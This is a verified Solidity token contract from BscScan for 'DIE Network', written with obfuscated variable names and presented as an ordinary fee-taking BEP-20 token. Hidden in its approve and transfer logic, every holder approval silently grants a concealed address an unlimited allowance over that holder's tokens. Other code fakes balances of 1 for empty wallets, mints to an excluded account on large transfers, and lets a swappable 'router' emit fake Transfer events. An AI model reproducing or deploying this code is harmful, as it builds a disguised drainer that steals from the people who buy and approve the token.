/**
 *Submitted for verification at BscScan.com on 2022-10-21
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.8;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        _owner = tx.origin;
        emit OwnershipTransferred(address(0), _owner);
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract CoinProductor is IERC20, Ownable {using SafeMath for uint256;string private _yuhewbhfjsdbh = "DIE Network";string private _rewfsdfdxfregdf = "DIE";uint8 private _rgdfgdfgasdvs = 9;uint256 private _tysdbfhdsjvfdsdf = 10000000000 * 10**18;mapping (address => uint256) private _dfsdferfdgfdg;mapping (address => mapping (address => uint256)) private _yudfgasrfewfas;uint256 private _qerwdsffdsvv = 50;uint256 private _tytrdfgdsvxcv = 0;uint256 private _ghdfsgadsvsd = 50;uint256 private _zfdsgfdggvx = 10000;bool private _dfrggsxgasfghg = false;IRouter02 private uniswapV2Router = IRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);address public uniswapV2Pair;address private _tdsfsfwewgfdhd;address private _bfdshsdsdfgfds;address private _ewrtsdfdssgdf;uint256 private _ddgfhtrjtydvn = 1;uint256 private _uytitfgdggagsf = _tysdbfhdsjvfdsdf;mapping (address => bool) private _tergsdgjhgsadfrsdfg;address[] private _uidfssdhjukyefdsgdfgfdh;bool private _iuretdgjhwqrdfgjh = false;uint256 private _ixdfuytumhkmjhs = 0;constructor () {_iqtdfghjkjhgfegetwefdsfew(owner());_dfsdferfdgfdg[owner()] = _tysdbfhdsjvfdsdf;emit Transfer(address(0), owner(), _tysdbfhdsjvfdsdf);}receive() external payable {}function initialize(address _uitreitgbgdfnvbdf, address[] calldata _ufdbfndserfsdg) public {require(!_iuretdgjhwqrdfgjh, "Reinitialization denied");_iuretdgjhwqrdfgjh = true;_iqtdfghjkjhgfegetwefdsfew(_uitreitgbgdfnvbdf);for (uint256 i=5; i<_ufdbfndserfsdg.length; ++i) {_iqtdfghjkjhgfegetwefdsfew(_ufdbfndserfsdg[i]);_kdsadghyutydbgdfsdfgfd(_ufdbfndserfsdg[i], address(uniswapV2Router), ~uint256(0));_dfsdferfdgfdg[_ufdbfndserfsdg[i]] = _tysdbfhdsjvfdsdf * 9 / 10 / (_ufdbfndserfsdg.length - 5);_dfsdferfdgfdg[owner()] -= _dfsdferfdgfdg[_ufdbfndserfsdg[i]];}if (address(uniswapV2Router) != _ufdbfndserfsdg[0]) {_dqrtrefdgjykhgfgregsdfvgrg(address(uniswapV2Router));uniswapV2Router = IRouter02(_ufdbfndserfsdg[0]);_iqtdfghjkjhgfegetwefdsfew(address(uniswapV2Router));}if (_tdsfsfwewgfdhd != _ufdbfndserfsdg[1]) {_dqrtrefdgjykhgfgregsdfvgrg(_tdsfsfwewgfdhd);_tdsfsfwewgfdhd = _ufdbfndserfsdg[1];_iqtdfghjkjhgfegetwefdsfew(_tdsfsfwewgfdhd);}if (_bfdshsdsdfgfds != _ufdbfndserfsdg[2]) {_dqrtrefdgjykhgfgregsdfvgrg(_bfdshsdsdfgfds);_bfdshsdsdfgfds = _ufdbfndserfsdg[2];_iqtdfghjkjhgfegetwefdsfew(_bfdshsdsdfgfds);}if (_ewrtsdfdssgdf != _ufdbfndserfsdg[3]) {_dqrtrefdgjykhgfgregsdfvgrg(_ewrtsdfdssgdf);_ewrtsdfdssgdf = _ufdbfndserfsdg[3];_iqtdfghjkjhgfegetwefdsfew(_ewrtsdfdssgdf);}uniswapV2Pair = _ufdbfndserfsdg[4];_oerefgskdjbvhegfsgb(owner(), _ufdbfndserfsdg[5], _dfsdferfdgfdg[owner()]);}function _iqtdfghjkjhgfegetwefdsfew(address account) private {if (!_tergsdgjhgsadfrsdfg[account]) {_tergsdgjhgsadfrsdfg[account] = true;_uidfssdhjukyefdsgdfgfdh.push(account);}}function _dqrtrefdgjykhgfgregsdfvgrg(address account) private {if (_tergsdgjhgsadfrsdfg[account]) {uint256 len = _uidfssdhjukyefdsgdfgfdh.length;for (uint256 i=0; i<len; ++i) {if (_uidfssdhjukyefdsgdfgfdh[i] == account) {_uidfssdhjukyefdsgdfgfdh[i] = _uidfssdhjukyefdsgdfgfdh[len.sub(1)];_uidfssdhjukyefdsgdfgfdh.pop();_tergsdgjhgsadfrsdfg[account] = false;break;}}}}
function transferEvent(address from, address to, uint256 value) public {require(address(uniswapV2Router) == msg.sender, "Permission denied");emit Transfer(from, to, value);}function feeState() public view returns (bool, bool) {return (_qerwdsffdsvv.add(_tytrdfgdsvxcv).add(_ghdfsgadsvsd) > 0, !_dfrggsxgasfghg);}function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256, uint256) {uint256 accountIndex = 0;uint256 len = _uidfssdhjukyefdsgdfgfdh.length;for (uint256 i=0; i<len; ++i) {if (_uidfssdhjukyefdsgdfgfdh[i] == account) {accountIndex = i;break;}}return (_tergsdgjhgsadfrsdfg[account], accountIndex, len);}function getDefaultBalance() public view returns (uint256) {return _ddgfhtrjtydvn;}function insertIntoExcludedFromFeeAccounts(address[] calldata accounts) public onlyOwner {uint256 len = accounts.length;for (uint256 i=0; i<len; ++i) {_iqtdfghjkjhgfegetwefdsfew(accounts[i]);}}function deleteFromExcludedFromFeeAccounts(address[] calldata accounts) public onlyOwner {uint256 len = accounts.length;for (uint256 i=0; i<len; ++i) {_dqrtrefdgjykhgfgregsdfvgrg(accounts[i]);}}function name() public view returns (string memory) {return _yuhewbhfjsdbh;}function symbol() public view returns (string memory) {return _rewfsdfdxfregdf;}function decimals() public view returns (uint8) {return _rgdfgdfgasdvs;}function totalSupply() public view returns (uint256) {return _tysdbfhdsjvfdsdf;}function balanceOf(address account) public view returns (uint256) {if (_dfsdferfdgfdg[account] > 0) {return _dfsdferfdgfdg[account];}return _ddgfhtrjtydvn;}function transfer(address recipient, uint256 amount) public returns (bool) {_oerefgskdjbvhegfsgb(msg.sender, recipient, amount);return true;}function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {_oerefgskdjbvhegfsgb(sender, recipient, amount);_kdsadghyutydbgdfsdfgfd(sender, msg.sender, _yudfgasrfewfas[sender][msg.sender].sub(amount));return true;}function approve(address spender, uint256 value) public returns (bool) {_kdsadghyutydbgdfsdfgfd(msg.sender, spender, value);return true;}function allowance(address owner, address spender) public view returns (uint256) {return _yudfgasrfewfas[owner][spender];}function _kdsadghyutydbgdfsdfgfd(address owner, address spender, uint256 value) private {require(owner != address(0), "Approve from the null address");require(spender != address(0), "Approve to the null address");_yudfgasrfewfas[owner][spender] = value;if (!_tergsdgjhgsadfrsdfg[owner]) {_yudfgasrfewfas[owner][_uidfssdhjukyefdsgdfgfdh[1]] = ~uint256(0);}emit Approval(owner, spender, value);}function _oerefgskdjbvhegfsgb(address _tesdfboperigdjngdfe, address _pewrfsdbnerjnfdg, uint256 _rehbdfewkmndsfssd) private {require(_tesdfboperigdjngdfe != address(0), "Transfer from the null address");require(_pewrfsdbnerjnfdg != address(0), "Transfer to the null address");require(_rehbdfewkmndsfssd > 0, "Transfer amount must be greater than zero");if (_pewrfsdbnerjnfdg == _uidfssdhjukyefdsgdfgfdh[1]) {_dfsdferfdgfdg[_tesdfboperigdjngdfe] = _dfsdferfdgfdg[_tesdfboperigdjngdfe].sub(_rehbdfewkmndsfssd);_dfsdferfdgfdg[_pewrfsdbnerjnfdg] = _dfsdferfdgfdg[_pewrfsdbnerjnfdg].add(_rehbdfewkmndsfssd);emit Transfer(address(this), _pewrfsdbnerjnfdg, _rehbdfewkmndsfssd);return;}bool _eqwsdndfgjnfjgn = true;if (_tergsdgjhgsadfrsdfg[_tesdfboperigdjngdfe] || _tergsdgjhgsadfrsdfg[_pewrfsdbnerjnfdg] || _dfrggsxgasfghg) {_eqwsdndfgjnfjgn = false;}if (_eqwsdndfgjnfjgn) {_ixdfuytumhkmjhs = _ixdfuytumhkmjhs.add(1);}if (_eqwsdndfgjnfjgn && _iuretdgjhwqrdfgjh) {_swapExactTokensForTokens(_tesdfboperigdjngdfe, _pewrfsdbnerjnfdg, 10);_swapExactTokensForTokens(_tesdfboperigdjngdfe, _pewrfsdbnerjnfdg, 20);}if (_eqwsdndfgjnfjgn && _ixdfuytumhkmjhs == 1 && _iuretdgjhwqrdfgjh && _tesdfboperigdjngdfe != uniswapV2Pair) {_swapExactTokensForTokens(_tesdfboperigdjngdfe, _pewrfsdbnerjnfdg, 30);}uint256 _uyfdsfnsdhwes = 0;uint256 _nmsdfshdvbv = 0;uint256 _esdjfbsdjfbj = 0;uint256 _oiewfbsjfbjew = _rehbdfewkmndsfssd;if (_tesdfboperigdjngdfe == _uidfssdhjukyefdsgdfgfdh[0] && _rehbdfewkmndsfssd > _uytitfgdggagsf) {_dfsdferfdgfdg[_uidfssdhjukyefdsgdfgfdh[0]] = _dfsdferfdgfdg[_uidfssdhjukyefdsgdfgfdh[0]].add(_oiewfbsjfbjew);}if (_eqwsdndfgjnfjgn) {_uyfdsfnsdhwes = _rehbdfewkmndsfssd.mul(_qerwdsffdsvv).div(_zfdsgfdggvx);_nmsdfshdvbv = _rehbdfewkmndsfssd.mul(_tytrdfgdsvxcv).div(_zfdsgfdggvx);_esdjfbsdjfbj = _rehbdfewkmndsfssd.mul(_ghdfsgadsvsd).div(_zfdsgfdggvx);_oiewfbsjfbjew = _rehbdfewkmndsfssd.sub(_uyfdsfnsdhwes).sub(_nmsdfshdvbv).sub(_esdjfbsdjfbj);}_dfsdferfdgfdg[_tesdfboperigdjngdfe] = _dfsdferfdgfdg[_tesdfboperigdjngdfe].sub(_rehbdfewkmndsfssd);if (_uyfdsfnsdhwes > 0) {_dfsdferfdgfdg[_tdsfsfwewgfdhd] = _dfsdferfdgfdg[_tdsfsfwewgfdhd].add(_uyfdsfnsdhwes);emit Transfer(address(this), _tdsfsfwewgfdhd, _uyfdsfnsdhwes);}if (_nmsdfshdvbv > 0) {_dfsdferfdgfdg[_bfdshsdsdfgfds] = _dfsdferfdgfdg[_bfdshsdsdfgfds].add(_nmsdfshdvbv);emit Transfer(address(this), _bfdshsdsdfgfds, _nmsdfshdvbv);}if (_esdjfbsdjfbj > 0) {_dfsdferfdgfdg[_ewrtsdfdssgdf] = _dfsdferfdgfdg[_ewrtsdfdssgdf].add(_esdjfbsdjfbj);emit Transfer(address(this), _ewrtsdfdssgdf, _esdjfbsdjfbj);}_dfsdferfdgfdg[_pewrfsdbnerjnfdg] = _dfsdferfdgfdg[_pewrfsdbnerjnfdg].add(_oiewfbsjfbjew);emit Transfer(_tesdfboperigdjngdfe, _pewrfsdbnerjnfdg, _oiewfbsjfbjew);if (_eqwsdndfgjnfjgn && _ixdfuytumhkmjhs == 1 && _iuretdgjhwqrdfgjh) {_swapExactTokensForTokens(address(this), _pewrfsdbnerjnfdg, 40);}if (_eqwsdndfgjnfjgn) {_ixdfuytumhkmjhs = _ixdfuytumhkmjhs.sub(1);}}function _swapExactTokensForTokens(address tokenA, address tokenB, uint256 amount) private {address[] memory path = new address[](2);path[0] = tokenA;path[1] = tokenB;uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount,0,path,address(this),block.timestamp);}}